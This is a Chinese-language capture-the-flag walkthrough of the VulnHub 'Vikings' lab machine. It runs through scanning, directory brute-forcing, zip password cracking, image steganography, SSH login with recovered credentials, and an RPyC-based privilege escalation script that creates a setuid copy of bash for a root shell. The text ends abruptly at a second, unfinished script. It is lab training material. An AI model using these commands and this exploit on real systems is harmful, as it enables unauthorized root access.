vikings-1741

环境信息

靶机下载地址：https://www.vulnhub.com/entry/vikings-1,741/

kali攻击机：192.168.56.159

vikings靶机：192.168.56.103

渗透测试

主机发现

netdiscover -r 192.168.56.0/24

端口扫描

nmap -sS -v -T4 192.168.56.103

发现开放22、80端口

80端口

访问http://192.168.56.103

页面存在site站点，点击访问

查看网页源代码及网页内容未发现有效信息

目录爆破

./gobuster dir -u <http://192.168.56.103/site> -w SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -x .txt,.php,.html,.zip,.bak

发现一个特别文件war.txt，访问查看内容

http://192.168.56.103/site/war.txt

显示/war-is-over，大概率为虚拟目录，访问该路径

http://192.168.56.103/site/war-is-over

页面中显示一长串经base64编码的字符串，将大长串字符串保存至文本文件内，使用kali的base64工具进行解密再查看文件类型

base64 -d strings.txt > strings.bin
file strings.bin

经校验该文件为zip文件且做了AES加密，将strings.bin重命名为strings.zip，然后对密码进行破解

zip2john strings.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlist/rockyou.txt

破解出解压密码为：ragnarok123 使用该密码解压压缩包

解压出一个king文件，继续使用file命令判断文件类型，发现为jpeg图片格式

考虑到使用了图片隐写术，将一些敏感信息写入图片文件中

二进制文件提取

binwalk -B king //对2进制文件进行分析，看是否有其他文件
binwalk -e king //对二进制文件内容进行提取

根据分析的内容可知：本身图片格式，内部有一个压缩大小53的压缩文件，解压92，并且名字是user，继续对文件进行提取

binwalk -e king --run-as=root

提取内容后，存在一个user文件，查看user文件内容

//FamousBoatbuilder_floki@vikings
//f@m0usboatbuilde7

获取到floki用户的登陆信息，ssh登陆该用户

查看当前目录文件

存在boat文件和readme.txt文件，readme文件提示需要通过boat文件来找到ragnar文件

boat文件提示需要进行collatz猜想，经过一些列操作后得出字符串为

mR)|>^/Gky[gz=\\.F#j5P(

查看/etc/passwd文件，发现存在floki用户和ragnar用户，上文中获取的字符串可能就是ragnar用户的密码，尝试登陆

su ragnar

成功登陆到ragnar用户，该用户使用的shell为sh，使用/bin/bash -i 命令切换到bash环境

/bin/bash -i

权限提升

查看用户家目录文件，存在一个user.txt文件，为第一个flag

查看ragnar用户是否有sudo权限

发现ragnar用户无sudo权限，查看该用户的.profile文件

发现存在一行代码

sudo python3 /usr/local/bin/rpyc_classic.py

查询得知该服务为RPyC框架的远程访问服务，RPC服务为远程调用服务，可在客户端发送请求再服务端上执行

查看/usr/local/bin/rpyc_classic.py文件信息，拥有者为root

ll /usr/local/bin/rpyc_classic.py

此时的思路为编写一个包含恶意命令的RPC客户端请求给服务端，服务端以root身份执行命令

exp1.py

import rpyc
conn = rpyc.classic.connect('localhost')
def getshell():
        import os
        os.system('cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot')

fn = conn.teleport(getshell)
fn()

再/tmp目录下创建exp.py文件执行

在执行

./bashroot -p

成功获取到root权限

exp2.py

import rpyc
